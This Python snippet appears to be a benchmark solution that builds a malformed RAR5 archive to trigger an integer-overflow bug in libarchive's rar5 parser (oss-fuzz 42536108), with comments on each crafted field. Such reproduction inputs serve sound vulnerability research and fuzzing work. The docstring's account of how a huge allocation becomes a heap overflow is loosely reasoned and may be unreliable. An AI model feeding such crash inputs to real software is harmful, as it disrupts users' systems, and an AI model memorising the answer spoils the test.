import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input for oss-fuzz:42536108.

        The vulnerability lies in libarchive's rar5 parser. It's an integer
        overflow leading to a heap buffer overflow. The size for a buffer
        allocation is calculated as:
        `size = archive_start_offset + quick_open_offset + quick_open_data_size`

        `archive_start_offset` is calculated as `current_pos - header_size`.
        By providing a very large `header_size`, we can make `archive_start_offset`
        a large negative number.

        When this negative `off_t` is added to the unsigned `uint64_t` offsets,
        it's promoted to a large positive `uint64_t`. This huge value is then used
        in a `malloc`, causing a heap overflow.

        The PoC creates a minimal RAR5 file structure to trigger this calculation:
        1. RAR5 signature.
        2. A Main Archive Header with a crafted 'Header Size' to cause the initial
           negative offset.
        3. The 'HFL_EXTRA' flag is set in the main header to trigger the parsing
           of a locator record (containing quick open offsets).
        4. The locator record data is supplied in the extra area.
        """
        
        # RAR5 file signature
        poc = b'Rar!\x1a\x07\x01\x00'

        # --- Main Archive Header Block ---
        # 1. Block CRC32 (can be zero for the PoC)
        poc += b'\x00\x00\x00\x00'

        # 2. Header Size (vint): A very large number. We encode 2^63 - 1,
        # which is the largest positive signed 64-bit integer (SSIZE_MAX on 64-bit).
        # This requires 9 bytes in RAR5's vint format.
        header_size_vint = b'\xff' * 8 + b'\x7f'
        poc += header_size_vint

        # 3. Header Type (vint): 2 for Main Archive Header
        poc += b'\x02'

        # --- Main Archive Header Data ---
        # 4. Header Flags (vint): 0x01 (HFL_EXTRA) to indicate an extra area
        # containing the vulnerable locator record is present.
        poc += b'\x01'

        # 5. Extra Area Size (vint): The extra area will contain two small vints.
        # quick_open_offset=1 (vint b'\x01') and quick_open_data_size=1 (vint b'\x01').
        # Total size is 1 + 1 = 2 bytes.
        poc += b'\x02'

        # 6. Extra Area Data: Contains the locator record.
        # - Quick Open Offset (vint): 1
        # - Quick Open Data Size (vint): 1
        poc += b'\x01\x01'

        # 7. Archive Flags (vint): 0 for no special flags (e.g., not a volume).
        poc += b'\x00'

        return poc